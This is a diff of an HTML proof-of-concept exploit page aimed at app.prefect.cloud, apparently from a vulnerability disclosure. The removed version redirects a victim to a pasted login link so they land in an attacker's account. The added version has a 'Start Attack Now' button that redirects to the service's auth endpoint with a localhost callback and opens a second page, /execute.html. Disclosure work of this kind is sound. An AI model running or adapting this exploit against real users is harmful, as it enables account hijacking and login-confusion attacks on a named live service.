@@ -1,24 +1,51 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>PoC</title>
+    <style>
+        div {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            top: 50%;
+            left: 50%;
+            position: absolute;
+            text-align: center;
+        }
+        .bounce {
+
+  background: #00bfff;
+  animation: bounce 2s infinite;
+}
+
+@keyframes bounce {
+  0%, 100% {
+    transform: translateY(0);
+    animation-timing-function: ease-in;
+  }
+  50% {
+    transform: translateY(-10px);
+    animation-timing-function: ease-out;
+  }
+}
+
+    </style>
 </head>
 <body>
-<h4>Using this attack vector, when you visit the application <b>app.prefect.cloud</b> you will be logged into an attacker account thinking it is your account</h4>
-<h4>Paste your login link here</h4>
 
-<label>
-    <textarea id="textarea"></textarea>
-</label>
-<button id="button">Submit</button>
+<div class="bounce">
+
+    Start Attack Now
+</div>
+
 <script>
-let button = document.querySelector("#button")
-let textarea = document.querySelector("#textarea")
-
-button.addEventListener("click",function () {
-    window.location.href = textarea.value
-})
+    let attack = document.querySelector(".bounce")
+    attack.addEventListener("click", () => {
+        window.location.href = "https://app.prefect.cloud/auth/client?callback=http://localhost:12345"
+        window.open("/execute.html")
+    })
 </script>
 </body>
 </html>
